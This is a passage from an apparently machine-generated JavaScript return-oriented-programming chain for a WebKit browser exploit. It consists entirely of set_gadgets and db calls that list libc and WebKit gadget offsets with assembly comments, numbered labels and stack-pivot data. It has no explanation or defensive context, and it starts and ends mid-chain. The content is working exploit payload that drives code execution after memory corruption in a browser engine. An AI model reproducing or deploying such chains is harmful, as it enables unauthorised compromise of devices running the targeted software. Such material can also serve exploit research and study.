libc_base+811575, //pop rsp
ropchain+194104, //L3016
//L3010:
libc_base+811575, //pop rsp
ropchain+198976, //L3017
//L3016:
libc_base+793877, //pop rsi
ropchain+194160, //L3019
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3018:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L3019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+194248, //L3021
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194264, //L3022
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3021:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3022:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+194408, //L3026
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+194376, //L3024
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194392, //L3025
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3024:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3025:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3026:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194480, //L3028
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3028:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+194536, //L3029
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3029:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+194632, //L3032
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3031:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L3032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+194720, //L3034
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194736, //L3035
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3034:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3035:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+194888, //L3038
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194920, //L3040
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+194872, //L3037
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194904, //L3039
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3037:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3038:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3039:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3040:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+195040, //L3042
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+195056, //L3043
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+195024, //L3041
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3041:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3042:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3043:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+195144, //L3045
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3045:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+195200, //L3046
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3046:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+195320, //L3048
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+195352, //L3050
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195336, //L3049
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3048:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3049:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3050:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+195512, //L3054
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195464, //L3051
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+195480, //L3052
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3051:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3052:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3053:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3054:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+195568, //L3055
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3055:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+195672, //L3057
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+195704, //L3059
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+195688, //L3058
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3057:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3058:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3059:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+195864, //L3063
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+195816, //L3060
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+195832, //L3061
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3060:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3061:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3062:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3063:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+195920, //L3064
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3064:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+196024, //L3066
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+196056, //L3068
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196040, //L3067
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3066:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3067:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3068:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+196216, //L3072
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+196168, //L3069
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196184, //L3070
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3069:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3070:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3071:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3072:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+196272, //L3073
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+196376, //L3075
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+196408, //L3077
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196392, //L3076
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3075:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3076:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3077:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+196480, //L3078
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+196496, //L3079
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3078:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3079:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+196656, //L3083
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+196608, //L3080
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196624, //L3081
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3080:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3081:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3082:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3083:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+196712, //L3084
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3084:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+196816, //L3086
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+196848, //L3088
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196832, //L3087
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3086:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3087:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3088:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+196944, //L3090
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196928, //L3089
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3089:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3090:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+197040, //L3092
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3091:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L3092:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+197128, //L3094
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197144, //L3095
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3094:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3095:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+197288, //L3099
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+197256, //L3097
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197272, //L3098
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3097:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3098:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3099:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+197360, //L3101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+197416, //L3102
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3102:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+197512, //L3105
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3104:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L3105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+197600, //L3107
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197616, //L3108
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3107:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3108:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+197768, //L3111
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+197800, //L3113
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+197752, //L3110
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197784, //L3112
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3110:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3111:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3112:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+197920, //L3115
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+197936, //L3116
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+197904, //L3114
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3114:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3115:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3116:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+198024, //L3118
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3118:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+198080, //L3119
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3119:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+198152, //L3122
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3122:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+198208, //L3124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3124:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L3125:
libc_base+793877, //pop rsi
ropchain+198312, //L3127
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3126:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L3127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+198400, //L3129
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+198416, //L3130
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3129:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3130:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+198568, //L3133
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+198600, //L3135
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+198552, //L3132
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+198584, //L3134
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3132:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3133:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3134:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3135:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+198696, //L3137
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+198680, //L3136
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3136:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3137:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+198784, //L3139
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3138:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3139:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+198856, //L3141
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3140:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L3141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+198920, //L3144
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3144:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+192832, //L2984
//L3017:
libc_base+811575, //pop rsp
ropchain+209168, //L3145
//L2972:
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+199048, //L3147
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3146:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3147:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3148:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3149:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3151:
ropchain+199248, //L3150
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+212032, //L3152
//L3150:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+199336, //L3154
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3153:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L3154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L3157:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199440, //L3159
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3158:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3159:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L3161:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199536, //L3163
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3162:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3163:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199608, //L3165
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3164:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3165:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199680, //L3167
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3166:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199752, //L3169
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3168:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3169:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199824, //L3171
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3170:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3171:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199896, //L3173
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3172:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+199968, //L3175
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3174:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200040, //L3177
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3176:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3177:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3178:
db([4294967257, 4294967295]); // -0x27
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+200136, //L3181
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3180:
db([2, 0]); // 0x2
set_gadget(libc_base+788575,); //pop rax
//L3181:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3182:
db([4294967258, 4294967295]); // -0x26
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+200224, //L3185
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3185:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3186:
db([15395, 0]); // 0x3c23
set_gadgets([
libc_base+562536, //mov [rdi], cx
libc_base+793877, //pop rsi
ropchain+200312, //L3188
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
